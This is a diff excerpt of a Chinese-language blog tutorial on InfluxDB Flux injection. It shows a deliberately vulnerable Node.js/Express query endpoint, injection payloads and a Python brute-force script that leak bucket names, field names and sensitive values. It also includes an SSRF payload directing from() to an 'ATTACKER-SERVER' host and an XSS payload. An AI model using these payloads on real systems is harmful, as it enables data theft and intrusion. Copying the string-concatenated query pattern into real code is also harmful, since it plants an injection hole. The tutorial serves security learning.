+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">InfluxDB</span><span class="p">,</span> <span class="nx">Point</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@influxdata/influxdb-client&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="s1">&#39;REDACTED&#39;</span> <span class="c1">// InfluxDB Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;https://127.0.0.1&#39;</span> <span class="c1">// Local Database endpoint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">org</span> <span class="o">=</span> <span class="s1">&#39;myOrg&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">bucket</span> <span class="o">=</span> <span class="s1">&#39;publicBucket&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">InfluxDB</span><span class="p">({</span><span class="nx">url</span><span class="p">,</span> <span class="nx">token</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">results</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">queryApi</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">getQueryApi</span><span class="p">(</span><span class="nx">org</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="kr">await</span> <span class="p">(</span><span class="kr">const</span> <span class="p">{</span><span class="nx">values</span><span class="p">,</span> <span class="nx">tableMeta</span><span class="p">}</span> <span class="k">of</span> <span class="nx">queryApi</span><span class="p">.</span><span class="nx">iterateRows</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">o</span> <span class="o">=</span> <span class="nx">tableMeta</span><span class="p">.</span><span class="nx">toObject</span><span class="p">(</span><span class="nx">values</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">results</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/query&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) |&gt; range(start: 0)  |&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server started on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当我们只传入<code>&quot;</code>的时候
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql16.png"
+        srcset="/img/nosql-inject/nosql16.png, /img/nosql-inject/nosql16.png 1.5x, /img/nosql-inject/nosql16.png 2x"
+        alt="/img/nosql-inject/nosql16.png"
+        title="/img/nosql-inject/nosql16.png" ></figure>
+发现了报错，也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|&gt; range(start: 0)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">|&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样的查询语句，其报错内容在 <a href="https://docs.influxdata.com/influxdb/v2.7/" target="_blank" rel="noopener noreferrer">https://docs.influxdata.com/influxdb/v2.7/</a> 可以查找到，所以可以知道是influxdb的数据库</p>
+<h3 id="构建一些playload" class="headerLink">
+    <a href="#%e6%9e%84%e5%bb%ba%e4%b8%80%e4%ba%9bplayload" class="header-mark"></a>构建一些playload</h3><h4 id="泄露bucket的名称" class="headerLink">
+    <a href="#%e6%b3%84%e9%9c%b2bucket%e7%9a%84%e5%90%8d%e7%a7%b0" class="header-mark"></a>泄露bucket的名称</h4><p>playload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="err">&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">buckets</span><span class="p">()</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">name</span> <span class="o">=~</span> <span class="sr">/^a.*/</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">name</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>该<code>buckets()</code>函数列出当前数据库中的所有存储桶。</li>
+<li>该<code>filter()</code>函数使用<code>r.name</code>表达式来过滤存储桶名称，该名称<code>r</code>是存储桶查询的结果，并且<code>name</code>是函数中返回的字段<code>buckets()</code>。</li>
+<li>如您所见，InfluxDB 查询支持正则表达式操作<code>=~</code>，因此条件背后的逻辑<code>r.name =~ /^a.*/</code>是，<code>true</code>如果存储桶名称以字母 开头，则为该条件<code>a</code>。</li>
+<li>之后，过滤器使用一个<code>and</code>条件来调用函数，<code>die()</code>并将存储桶名称的值作为参数。该<code>die()</code>函数会抛出一个错误，并在第一个参数中传递自定义消息，这将泄漏存储桶名称。</li>
+<li>有效负载也在<code>yield()</code>存储桶查询之前使用该函数。这是在 InfluxDB 上的单个请求中执行“多个查询”所必需的。</li>
+<li>最后，有必要用<code>yield()</code>一个新行将 与存储桶查询分开，并且在有效负载的末尾，我在<code>//</code>另一个新行后面添加了表达式，以注释注入后的所有内容。</li>
+</ol>
+<p>也就是如果数据库中存在以<code>a</code>开头的数据库名，他就会返回其name，如果没有的话就会返回null
+当为<code>a</code>时：
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql17.png"
+        srcset="/img/nosql-inject/nosql17.png, /img/nosql-inject/nosql17.png 1.5x, /img/nosql-inject/nosql17.png 2x"
+        alt="/img/nosql-inject/nosql17.png"
+        title="/img/nosql-inject/nosql17.png" ></figure>
+当为<code>p</code>时：
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql18.png"
+        srcset="/img/nosql-inject/nosql18.png, /img/nosql-inject/nosql18.png 1.5x, /img/nosql-inject/nosql18.png 2x"
+        alt="/img/nosql-inject/nosql18.png"
+        title="/img/nosql-inject/nosql18.png" ></figure>
+可以看见返回了<code>privateBucket</code>这个bucket，这个地方可以用burp爆
+exp.py:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://127.0.0.1:3000?query=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">para1</span><span class="o">=</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="k">yield</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="s2">&#34;1337&#34;</span><span class="p">)</span> <span class="n">buckets</span><span class="p">()</span> <span class="o">|&gt;</span> <span class="nb">filter</span><span class="p">(</span><span class="n">fn</span><span class="p">:</span> <span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">r</span><span class="o">.</span><span class="n">name</span> <span class="o">=~</span> <span class="o">/^</span><span class="p">{}</span><span class="o">.*/</span> <span class="ow">and</span> <span class="n">die</span><span class="p">(</span><span class="n">msg</span><span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">name</span><span class="p">))</span> <span class="o">//</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">sensitive_field</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">52</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">htmlLen</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">para1</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">j</span><span class="p">))</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">htmlLen</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">htmlLen</span><span class="p">,</span><span class="n">endd</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">为了让你们更加直观的看见playload</span><span class="err">，</span><span class="n">所以这里没有进行编码</span><span class="err">，</span><span class="n">所以可能在para1处会报错</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="泄露bucket及其相关数据" class="headerLink">
+    <a href="#%e6%b3%84%e9%9c%b2bucket%e5%8f%8a%e5%85%b6%e7%9b%b8%e5%85%b3%e6%95%b0%e6%8d%ae" class="header-mark"></a>泄露bucket及其相关数据</h4><p>前面已经有bucket的名称了，所以就直接from</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;) 
+</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="err">&#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl"> <span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就是把<code>filter</code>中的<code>r</code>也就是匹配出来的所有东西都输出出来
+最终页面返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="nx">_value</span><span class="o">:</span> <span class="nx">B</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_time</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_stop</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_start</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_measurement</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_field</span><span class="o">:</span> <span class="nx">string</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是这个bucket中的所有的结构和其对应的数据类型，那么接下来便可以爆破其字段的名称</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="err">&#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">=~</span> <span class="sr">/s.*/</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">_field</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是爆破出以<code>s</code>开头的字段名称，这个和前面泄露bucket名的是一个原理
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql19.png"
+        srcset="/img/nosql-inject/nosql19.png, /img/nosql-inject/nosql19.png 1.5x, /img/nosql-inject/nosql19.png 2x"
+        alt="/img/nosql-inject/nosql19.png"
+        title="/img/nosql-inject/nosql19.png" ></figure>
+可以看见这个字段名为:<code>sensitive_field</code>
+接下来就是爆其数据了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="s2">&#34;) |&gt; range(start: 0) |&gt; filter(fn: (r) =&gt; r._field == &#34;</span><span class="nx">sensitive_field</span><span class="err">&#34;</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">string</span><span class="p">(</span><span class="nx">v</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">_value</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意下这里的数据类型！！不然可能会报错(放出为int类型的时候，<strong>因为r.field默认为int类型</strong>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="nl">HttpError</span><span class="p">:</span> <span class="n">runtime</span> <span class="n">error</span> <span class="err">@</span><span class="mi">2</span><span class="o">:</span><span class="mi">54</span><span class="o">-</span><span class="mi">2</span><span class="o">:</span><span class="mi">124</span><span class="o">:</span> <span class="nl">filter</span><span class="p">:</span> <span class="n">type</span> <span class="nl">conflict</span><span class="p">:</span> <span class="n">string</span> <span class="o">!=</span> <span class="kt">int</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql20.png"
+        srcset="/img/nosql-inject/nosql20.png, /img/nosql-inject/nosql20.png 1.5x, /img/nosql-inject/nosql20.png 2x"
+        alt="/img/nosql-inject/nosql20.png"
+        title="/img/nosql-inject/nosql20.png" ></figure>
+可以看见这里的值为1337</p>
+<h2 id="ssrf利用" class="headerLink">
+    <a href="#ssrf%e5%88%a9%e7%94%a8" class="header-mark"></a>SSRF利用</h2><p>在官方文档中，可以看见influxdb在from函数之中是可以接受host参数的
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql21.png"
+        srcset="/img/nosql-inject/nosql21.png, /img/nosql-inject/nosql21.png 1.5x, /img/nosql-inject/nosql21.png 2x"
+        alt="/img/nosql-inject/nosql21.png"
+        title="/img/nosql-inject/nosql21.png" ></figure>
+所以可以构造playload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="mi">1337</span><span class="s2">&#34;, host:&#34;</span><span class="nx">https</span><span class="o">:</span><span class="c1">//ATTACKER-SERVER&#34;) |&gt; range(start:0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="xss利用" class="headerLink">
+    <a href="#xss%e5%88%a9%e7%94%a8" class="header-mark"></a>XSS利用</h2><p>看见上面构建的程序</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/query&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) |&gt; range(start: 0)  |&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当 InfluxDB 查询中发生错误时，该<code>try{ } catch{ }</code>语句会将错误发送回客户端，并使用<code>Content-Type</code>equals to <code>text/html</code>，允许浏览器加载 HTML 和 JavaScript。
+这个时候我们就可以利用die函数在浏览器上执行xss</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s2">&#34;) die(msg:&#34;</span><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql22.png"
+        srcset="/img/nosql-inject/nosql22.png, /img/nosql-inject/nosql22.png 1.5x, /img/nosql-inject/nosql22.png 2x"
+        alt="/img/nosql-inject/nosql22.png"
+        title="/img/nosql-inject/nosql22.png" ></figure></p>
+<p>参考文章：
+<a href="https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8</a>
+<a href="https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data" target="_blank" rel="noopener noreferrer">https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data</a>
+<a href="https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries" target="_blank" rel="noopener noreferrer">https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries</a>
+<a href="https://docs.influxdata.com/influxdb/v2/" target="_blank" rel="noopener noreferrer">https://docs.influxdata.com/influxdb/v2/</a></p></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2024-02-06</span>
+                <span>Updated on 2024-02-01</span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -120,20 +1575,20 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"></section>
